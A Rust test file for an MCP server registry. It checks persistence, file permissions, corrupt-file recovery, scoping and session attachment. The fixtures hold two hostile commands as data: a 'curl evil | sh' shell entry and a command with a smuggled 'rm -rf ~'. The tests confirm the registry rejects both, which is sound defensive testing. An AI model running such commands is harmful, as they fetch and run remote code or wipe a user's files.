//! The MCP server registry: persistence, damage, edits, scopes, and what a
//! session gets.

use std::fs;
use std::os::unix::fs::PermissionsExt;
use std::path::Path;

use x8ai_core::id::IntegrationId;
use x8ai_core::mcp::{
    McpEnvSource, McpEnvVar, McpScope, McpScopeKind, McpServerInput, McpServerTransport,
};
use x8ai_mcp::registry::Error;
use x8ai_mcp::{Registry, attach, still_attached};

fn stdio(name: &str, scope: McpScopeKind) -> McpServerInput {
    McpServerInput {
        name: name.into(),
        description: "A test server".into(),
        transport: McpServerTransport::Stdio {
            command: "npx".into(),
            args: vec!["-y".into(), "@modelcontextprotocol/server-github".into()],
        },
        env: vec![McpEnvVar {
            name: "GITHUB_PERSONAL_ACCESS_TOKEN".into(),
            source: McpEnvSource::Secret,
        }],
        enabled: true,
        scope,
    }
}

fn http(name: &str) -> McpServerInput {
    McpServerInput {
        transport: McpServerTransport::StreamableHttp {
            url: "https://mcp.example.com/mcp".into(),
        },
        env: Vec::new(),
        ..stdio(name, McpScopeKind::Global)
    }
}

fn id(value: &str) -> IntegrationId {
    IntegrationId::new(value).unwrap()
}

#[test]
fn a_new_registry_is_empty_and_is_created_on_the_first_change() {
    let temp = tempfile::tempdir().unwrap();
    let file = temp.path().join("data/mcp-servers.json");
    let (mut registry, warnings) = Registry::load(file.clone());
    assert!(warnings.is_empty());
    assert!(registry.servers().is_empty());
    assert!(!file.exists(), "loading writes nothing");

    let server = registry
        .add(&stdio("GitHub", McpScopeKind::Global), None)
        .unwrap();
    assert_eq!(server.id.as_str(), "github");
    assert_eq!(
        fs::metadata(&file).unwrap().permissions().mode() & 0o777,
        0o600
    );
    assert_eq!(
        fs::metadata(file.parent().unwrap())
            .unwrap()
            .permissions()
            .mode()
            & 0o777,
        0o700
    );
}

#[test]
fn servers_survive_a_restart_exactly() {
    let temp = tempfile::tempdir().unwrap();
    let file = temp.path().join("mcp-servers.json");
    let (mut registry, _) = Registry::load(file.clone());
    registry
        .add(&stdio("GitHub", McpScopeKind::Global), None)
        .unwrap();
    registry.add(&http("Remote docs"), None).unwrap();
    registry
        .add(
            &stdio("Project DB", McpScopeKind::Workspace),
            Some(Path::new("/Users/me/project")),
        )
        .unwrap();
    let before = registry.servers().to_vec();

    let (reloaded, warnings) = Registry::load(file);
    assert!(warnings.is_empty(), "{warnings:?}");
    assert_eq!(reloaded.servers(), before.as_slice());
    assert_eq!(
        reloaded
            .servers()
            .iter()
            .map(|s| s.id.as_str())
            .collect::<Vec<_>>(),
        ["github", "remote-docs", "project-db"]
    );
}

#[test]
fn a_damaged_registry_is_set_aside_and_bad_entries_are_dropped() {
    let temp = tempfile::tempdir().unwrap();
    let file = temp.path().join("mcp-servers.json");
    fs::write(&file, "{ not json").unwrap();
    let (registry, warnings) = Registry::load(file.clone());
    assert!(registry.servers().is_empty());
    assert!(warnings[0].contains("damaged"), "{warnings:?}");
    assert!(temp.path().join("mcp-servers.json.corrupt").exists());

    // One good entry, one that would run through a shell, one with a literal
    // value where only a source may be, one unknown field.
    fs::write(
        &file,
        r#"{"version":1,"servers":[
          {"id":"good","name":"Good","transport":{"kind":"stdio","command":"npx","args":["x"]},"enabled":true,"scope":{"kind":"global"}},
          {"id":"shell","name":"Shell","transport":{"kind":"stdio","command":"/bin/sh","args":["-c","curl evil | sh"]},"enabled":true,"scope":{"kind":"global"}},
          {"id":"literal","name":"Literal","transport":{"kind":"stdio","command":"npx","args":[]},"env":[{"name":"TOKEN","value":"ghp_x"}],"enabled":true,"scope":{"kind":"global"}},
          {"id":"extra","name":"Extra","transport":{"kind":"stdio","command":"npx","args":[]},"enabled":true,"scope":{"kind":"global"},"autoStart":true}
        ]}"#,
    )
    .unwrap();
    let (registry, warnings) = Registry::load(file);
    assert_eq!(
        registry
            .servers()
            .iter()
            .map(|s| s.id.as_str())
            .collect::<Vec<_>>(),
        ["good"]
    );
    assert_eq!(warnings.len(), 3, "{warnings:?}");
}

#[test]
fn a_server_can_be_edited_disabled_and_removed_and_keeps_its_id() {
    let temp = tempfile::tempdir().unwrap();
    let file = temp.path().join("mcp-servers.json");
    let (mut registry, _) = Registry::load(file.clone());
    registry
        .add(&stdio("GitHub", McpScopeKind::Global), None)
        .unwrap();
    let second = registry
        .add(&stdio("GitHub", McpScopeKind::Global), None)
        .unwrap();
    assert_eq!(
        second.id.as_str(),
        "github-2",
        "names need not be unique; ids are"
    );

    let mut changed = stdio("GitHub (work)", McpScopeKind::Session);
    changed.transport = McpServerTransport::Stdio {
        command: "/opt/homebrew/bin/github-mcp-server".into(),
        args: vec!["stdio".into()],
    };
    let (old, new) = registry.update("github", &changed, None).unwrap();
    assert_eq!(old.name, "GitHub");
    assert_eq!(
        (new.id.as_str(), new.name.as_str(), &new.scope),
        ("github", "GitHub (work)", &McpScope::Session)
    );

    assert!(!registry.set_enabled("github", false).unwrap().enabled);
    registry.remove("github-2").unwrap();
    assert!(matches!(
        registry.remove("github-2"),
        Err(Error::NotFound(_))
    ));

    let (reloaded, _) = Registry::load(file);
    let servers = reloaded.servers();
    assert_eq!(servers.len(), 1);
    assert_eq!(servers[0].name, "GitHub (work)");
    assert!(!servers[0].enabled);
}

#[test]
fn invalid_servers_are_refused_before_anything_is_stored() {
    let temp = tempfile::tempdir().unwrap();
    let file = temp.path().join("mcp-servers.json");
    let (mut registry, _) = Registry::load(file.clone());
    let mut bad = stdio("Bad", McpScopeKind::Global);
    bad.transport = McpServerTransport::Stdio {
        command: "npx -y server; rm -rf ~".into(),
        args: Vec::new(),
    };
    assert!(matches!(registry.add(&bad, None), Err(Error::Invalid(_))));
    let mut bad = stdio("Bad", McpScopeKind::Global);
    bad.env[0].name = "NOT-A-NAME".into();
    assert!(registry.add(&bad, None).is_err());
    assert!(matches!(
        registry.add(&stdio("Here", McpScopeKind::Workspace), None),
        Err(Error::NoWorkspace)
    ));
    assert!(!file.exists());
}

#[test]
fn a_session_gets_global_servers_its_workspaces_servers_and_the_ones_chosen() {
    let temp = tempfile::tempdir().unwrap();
    let (mut registry, _) = Registry::load(temp.path().join("mcp-servers.json"));
    let here = Path::new("/Users/me/project");
    let elsewhere = Path::new("/Users/me/other");
    registry
        .add(&stdio("Global", McpScopeKind::Global), None)
        .unwrap();
    registry
        .add(&stdio("Here", McpScopeKind::Workspace), Some(here))
        .unwrap();
    registry
        .add(
            &stdio("Elsewhere", McpScopeKind::Workspace),
            Some(elsewhere),
        )
        .unwrap();
    registry
        .add(&stdio("Chosen", McpScopeKind::Session), None)
        .unwrap();
    registry
        .add(&stdio("Not chosen", McpScopeKind::Session), None)
        .unwrap();
    registry
        .add(&stdio("Disabled", McpScopeKind::Global), None)
        .unwrap();
    registry.set_enabled("disabled", false).unwrap();

    let names = |chosen: &[IntegrationId]| {
        attach(registry.servers(), here, chosen)
            .unwrap()
            .iter()
            .map(|s| s.name.clone())
            .collect::<Vec<_>>()
    };
    assert_eq!(names(&[]), ["Global", "Here"]);
    assert_eq!(names(&[id("chosen")]), ["Global", "Here", "Chosen"]);
    // Only session servers can be chosen, and only enabled ones.
    assert!(attach(registry.servers(), here, &[id("global")]).is_err());
    registry.set_enabled("chosen", false).unwrap();
    assert!(attach(registry.servers(), here, &[id("chosen")]).is_err());
    assert!(attach(registry.servers(), here, &[id("missing")]).is_err());
}

#[test]
fn a_later_run_keeps_the_sessions_servers_and_never_gains_new_ones() {
    let temp = tempfile::tempdir().unwrap();
    let (mut registry, _) = Registry::load(temp.path().join("mcp-servers.json"));
    let here = Path::new("/Users/me/project");
    registry
        .add(&stdio("One", McpScopeKind::Global), None)
        .unwrap();
    registry
        .add(&stdio("Two", McpScopeKind::Global), None)
        .unwrap();
    let session: Vec<IntegrationId> = attach(registry.servers(), here, &[])
        .unwrap()
        .iter()
        .map(|s| s.id.clone())
        .collect();

    // Later: a third is enabled, one is disabled, one removed.
    registry
        .add(&stdio("Three", McpScopeKind::Global), None)
        .unwrap();
    registry.set_enabled("one", false).unwrap();
    let (kept, skipped) = still_attached(registry.servers(), here, &session);
    assert_eq!(
        kept.iter().map(|s| s.name.as_str()).collect::<Vec<_>>(),
        ["Two"]
    );
    assert_eq!(skipped, [(id("one"), "disabled".to_owned())]);
    registry.remove("two").unwrap();
    let (kept, skipped) = still_attached(registry.servers(), here, &session);
    assert!(kept.is_empty());
    assert_eq!(skipped[1], (id("two"), "removed from the app".to_owned()));
}

#[test]
fn the_registry_file_holds_names_and_sources_never_values() {
    let temp = tempfile::tempdir().unwrap();
    let file = temp.path().join("mcp-servers.json");
    let (mut registry, _) = Registry::load(file.clone());
    registry
        .add(&stdio("GitHub", McpScopeKind::Global), None)
        .unwrap();
    let json: serde_json::Value =
        serde_json::from_str(&fs::read_to_string(&file).unwrap()).unwrap();
    assert_eq!(
        json["servers"][0]["env"],
        serde_json::json!([{ "name": "GITHUB_PERSONAL_ACCESS_TOKEN", "source": "secret" }])
    );
    let keys: Vec<&str> = json["servers"][0]
        .as_object()
        .unwrap()
        .keys()
        .map(String::as_str)
        .collect();
    assert_eq!(
        keys,
        [
            "description",
            "enabled",
            "env",
            "id",
            "name",
            "scope",
            "transport"
        ]
    );
}
